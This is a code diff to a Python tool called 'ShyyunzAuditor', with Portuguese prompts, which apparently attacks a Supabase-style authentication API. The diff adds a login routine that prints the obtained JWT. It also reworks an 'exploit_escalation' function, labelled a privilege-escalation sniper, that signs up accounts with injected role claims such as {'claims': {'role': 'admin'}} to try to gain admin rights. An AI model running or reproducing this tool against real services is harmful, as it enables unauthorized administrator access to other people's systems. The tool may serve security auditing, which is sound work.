@@ -790,7 +790,22 @@ class ShyyunzAuditor:
                     else:
                         console.print(f"[yellow][!] Conta criada, mas sem token (confirmação por e-mail pode estar ativada).[/yellow]")
                         console.print(f"[dim]    Resposta: {json.dumps(data, indent=2)[:300]}[/dim]")
-                        return None
+
+                        while True:
+                            confirmed = input("[?] Você já confirmou o e-mail? (S para tentar login / N para cancelar): ").strip().upper()
+                            if confirmed == "N":
+                                return None
+                            if confirmed != "S":
+                                console.print("[yellow][!] Opção inválida. Use S ou N.[/yellow]")
+                                continue
+
+                            token = await self.login_account(email, password)
+                            if token:
+                                return token
+
+                            retry = input("[?] Login ainda sem sucesso. Tentar novamente após confirmar e aguardar? (S/N): ").strip().upper()
+                            if retry != "S":
+                                return None
                 else:
                     msg = data.get('msg') or data.get('error_description') or data.get('message') or str(data)
                     console.print(f"[red][!] Falha ao criar conta ({r.status_code}): {msg}[/red]")
@@ -799,9 +814,37 @@ class ShyyunzAuditor:
                 console.print(f"[red][!] Erro de conexão: {e}[/red]")
                 return None
 
+    async def login_account(self, email: str, password: str):
+        """Tenta logar com e-mail/senha e retorna access_token se sucesso."""
+        body = {"email": email, "password": password}
+        async with httpx.AsyncClient() as client:
+            try:
+                r = await client.post(
+                    f"{self.auth_url}token?grant_type=password",
+                    headers={"apikey": self.apikey, "Content-Type": "application/json"},
+                    json=body,
+                    timeout=10.0
+                )
+                data = r.json()
+                if r.status_code in [200, 201]:
+                    token = data.get("access_token")
+                    if token:
+                        console.print(f"[bold green][+] Login confirmado com sucesso para {email}.[/bold green]")
+                        console.print(f"[bold cyan][🔑] JWT TOKEN ACESSÍVEL:[/bold cyan]\n[dim]{token}[/dim]\n")
+                        return token
+                    console.print("[yellow][!] Login retornou sem access_token.[/yellow]")
+                    return None
+
+                msg = data.get('msg') or data.get('error_description') or data.get('message') or str(data)
+                console.print(f"[red][!] Falha no login ({r.status_code}): {msg}[/red]")
+                return None
+            except Exception as e:
+                console.print(f"[red][!] Erro de conexão no login: {e}[/red]")
+                return None
+
     async def exploit_escalation(self):
         console.print("\n[bold cyan]─── SNIPER DE ESCALONAMENTO DE PRIVILÉGIOS ───[/bold cyan]")
-        base_email = input("[?] Digite o email base (ex: admin@shy.sec): ").strip()
+        base_email = input("[?] Digite o email base (ex: admin@shyyunz.sec): ").strip()
         base_email = "".join(ch for ch in base_email if ch.isprintable())
         password = input("[?] Digite a senha desejada: ").strip()
         password = "".join(ch for ch in password if ch.isprintable())
@@ -818,14 +861,9 @@ class ShyyunzAuditor:
             {"claims": {"role": "admin"}}
         ]
         
-        email_parts = base_email.split("@")
-        user_part = email_parts[0]
-        domain_part = email_parts[1]
-        
         success = False
         for i, p in enumerate(payloads, 1):
-            # Adiciona um sufixo ao email para cada tentativa para evitar "User already exists"
-            current_email = f"{user_part}+{i}@{domain_part}"
+            current_email = base_email
             console.print(f"[dim]  [{i}/5] Tentando: {current_email} com payload: {json.dumps(p)}[/dim]")
             token = await self.create_account(current_email, password, p)
             if token:
